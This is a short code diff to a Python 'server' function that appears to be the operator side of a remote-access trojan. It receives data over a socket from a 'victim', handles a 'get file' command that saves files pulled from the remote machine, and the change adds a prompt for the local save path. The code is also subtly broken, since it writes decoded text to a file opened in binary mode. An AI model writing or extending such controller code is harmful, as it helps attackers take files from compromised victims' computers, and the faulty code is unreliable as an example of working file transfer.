@@ -14,7 +14,8 @@ def server():
         data = client_socket.recv(1024).decode('utf-8')
         if 'get file ' in command:
             command = command.replace('get file ', '')
-            with open(command, 'wb')as file:
+            file_path = input("Where do you want to save the file")
+            with open(file_path, 'wb')as file:
                 file.writelines(data)
 
         print('From victim: ' + data)
